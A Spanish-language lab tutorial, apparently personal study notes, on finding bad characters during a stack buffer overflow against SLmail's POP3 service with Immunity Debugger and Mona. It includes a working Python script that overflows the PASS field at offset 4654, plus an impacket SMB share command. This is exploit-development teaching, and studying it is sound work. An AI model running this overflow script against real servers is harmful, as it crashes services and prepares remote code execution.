-----
- Tags: #badchars #bytearrays
----
# Definición

> En la generación de nuestro shellcode malicioso para la explotación del buffer overflow, es posible que algunos caracteres no sean interpretados correctamente por el programa objetivo. Estos caracteres se conocen como “**badchars**” y pueden causar que el shellcode falle o que el programa objetivo se cierre inesperadamente.

Para evitar esto, es importante identificar y eliminar los badchars del shellcode. Veremos cómo desde **Immunity Debugger** podremos aprovechar la funcionalidad **Mona** para generar diferentes bytearrays con casi todos los caracteres representados, y luego identificar los caracteres que el programa objetivo **no logra interpretar**.

Una vez identificados los **badchars**, se pueden descartar del shellcode final y **generar un nuevo shellcode que no contenga estos caracteres**. Para identificar los badchars, se pueden utilizar diferentes técnicas, como la introducción de diferentes Bytesarrays con caracteres hexadecimales consecutivos, que permiten identificar los caracteres que el programa objetivo no logra interpretar.

-------
# Detección de Badchars

Vamos a intentar identificar que caracteres permite el programa y cuales no, todo esto **aprovechándonos del espacio de la Pila**, específicamente en donde previamente nosotros introducimos nuestras letras "*C*".

Lo primero que vamos a hacer es **identificar nuestro espacio de trabajo** donde se almacenará la cadena de **Bytes** que nos permita **detectar** cuales son los badchars del programa SLmail, para esto en el campo de entrada de la parte inferior del Immunity Debugger colocaremos ``!mona`` para ejecutar la extensión **Mona**.

![[BOF 13.png]]

Ahora en la misma casilla ejecutaremos la instrucción ``!mona config``, esto con el objetivo de identificar como establecer o setear nuestro **directorio de trabajo**. Toda la información se verá plasmada en la parte inferior de la consola.

![[BOF 14.png]]

Vemos que hay un parámetro ``-set <parameter> <value>`` que sirve para que indiquemos donde esta la ruta que queremos contemplar para almacenar nuestros recursos ahí, y una línea mas abajo se ve cuales son los parámetros válidos.

En nuestro caso usaremos el parámetro ``workingfolder``, por lo tanto pondríamos lo siguiente

- ``-set workingfolder C:\Users\Santi\Desktop\Analysis``

Esto lo hacemos para crear una carpeta llamada ``Analysis`` en la ruta que especificamos, todo esto con el objetivo de tener un lugar cómodo para trabajar. Es común que no veamos la carpeta si nos metemos en esa ruta, para poder verla debemos crear un **Bytearray**.

Usaremos el siguiente comando para crear un **Bytearray**, de esta manera veremos todas las posibles combinatorias de caracteres lo cual nos servirá para aplicar un filtro con la misma herramienta Mona y detectar cuales son los **badchars**.

- ``!mona bytearray``

![[BOF 15.png]]

Algo que tenemos que tener en cuenta es que el **NullByte** (``\x00``) siempre suele dar problemas ya que este, en los lenguajes de programación, suele indicar el final de una cadena o del código, a veces omitiendo el contenido que le sigue a el. 
Nosotros podemos **eliminar el NullByte de forma manual** del archivo ``bytearray.txt``, o podemos en el panel de entrada de Immunity escribir ``!mona bytearray -cpb '\x00'`` para modificar el archivo automáticamente excluyendo el NullByte.

------

Nuestro objetivo ahora es que en vez de escribir en la Pila las letras "*C*", escribiremos el **Bytearray** que hemos creado con **Mona**, de esta forma tendremos que ver cual es el caracter que no sale representado dentro de la Pila para detectar que es un **Badchar**.

Lo que debemos hacer es pasarnos el archivo ``bytearray.txt`` a nuestra **máquina de atacante**, esto lo podemos hacer montándonos un servidor **SMB**, **Samba** desde Linux.

- ``impacket-smbserver smbfolder $(pwd) -smb2support``

Nosotros estamos **creando un recurso compartido a nivel de red** con nombre ``smbfolder``, que queremos que esté **sincronizado** con el directorio actual de trabajo, además le daremos **soporte** a la versión 2 de SMB porque en ocasiones el Windows suele requerirlo.
Ahora la idea sería ir a la máquina Windows en el **Explorador de archivos** y colocar ``\\ip-máquina-atacante\smbfolder`` para que se nos abra la carpeta de la máquina de atacante nuestra. Por ultimo simplemente arrastramos el archivo ``bytearray.txt`` a la carpeta de ``smbfolder`` de esta forma ya tendríamos el archivo TXT en nuestra máquina Linux.

Copiamos todas las combinatorias del **Bytearray** que están dentro del archivo ``bytearray.txt`` y lo vamos a meter en nuestro script de Python llamado ``eip-control.py``.

![[BOF 16.png]]

```python
#!/usr/bin/python3

import socket
import sys

# Variables globales. 
ip_address = "192.168.0.120"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
esp = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + esp


def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address, port))
    banner = s.recv(1024)

    s.send(b"USER test" + b'\r\n')
    response = s.recv(1024) 
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
```

Procedemos a **ejecutar el script** y analizamos el comportamiento de la Pila para determinar cuales son los Badchars, esto se puede realizar de forma manual observando cuales son los que faltan o simplemente utilizar la herramienta ``!mona compare`` para comparar los caracteres actuales de la Pila con los caracteres que nos otorgó el archivo ``bytearray``, de esta forma nos reportará cuales son los que no aparecen, que en ese caso serían Badchars.

![[BOF 17.png]]

Utilizaremos el siguiente comando en el campo de entrada del Immunity Debugger

- ``!mona compare -a 0x0275A128 -f C:\Users\Santi\Desktop\Analysis\bytearray.bin``

El parámetro ``-a`` se utiliza en Mona para indicar la **Dirección** o **Address** que queramos comparar con el archivo ``bytearray.bin``, en nuestro caso colocaremos la dirección brindada por el **ESP**, que en mi caso es *0275A128* y luego con el parámetro ``-f`` indicamos donde está el archivo ``bytearray.bin`` con el que queremos comparar. ==NOTA:== En este caso no debemos utilizar el archivo ``.txt`` si no el ``.bin``.

![[BOF 18.png]]

Los BadChars que detectó Mona fueron el ``00`` y el ``0a`` por lo tanto nuevamente le decimos a **Mona** que **excluya esos caracteres** del archivo ``bytearray`` con el parámetro ``bytearray -cpb``.

- ``!mona bytearray -cpb '\x00\x0a'``

Ahora volvemos a **modificar** nuestro script ``eip-control.py`` **quitándole esos badchars** que en mi caso lo voy a hacer manual.

Una vez quitados los dos caracteres volvemos a ejecutar el script y observamos la Pila nuevamente, ahora deberíamos **repetir todos los procedimientos de detección de Badchars** hasta que **ya no salgan mas**.

==NOTA:== Entre intento e intento **debemos reiniciar el SLmail y el Immunity Debugger** debido a que vamos a estar crasheando constantemente el programa, es por eso que el valor de la dirección/address del **ESP** varía en los próximos ejemplos.

- ``!mona compare -a 01BAA128 -f C:\Users\Santi\Desktop\Analysis\bytearray.bin``

![[BOF 19.png]]

Como podemos ver apareció uno nuevo, por lo tanto lo **eliminamos** de nuestro script y con Mona ejecutamos el ``!mona bytearray -cpb '\x00\x0a\x0d'`` para eliminar el **nuevo Badchar** del archivo ``bytearray`` y volvemos a repetir.

- ``!mona compare -a 0271A128 -f C:\Users\Santi\Desktop\Analysis\bytearray.bin``

![[BOF 20.png]]

De esta forma conseguimos **eliminar todos los BadChars de la Pila**, por lo tanto tenemos libertad de poder crear nuestro **Shellcode** en base a los caracteres permitidos.

Nuestro objetivo ahora es tratar de **encontrar una dirección** a la cual desde el **EIP** apuntemos para que **se aplica un salto hacia el ESP**, esto lo validaremos metiendo **Breakpoints** en la próxima sección.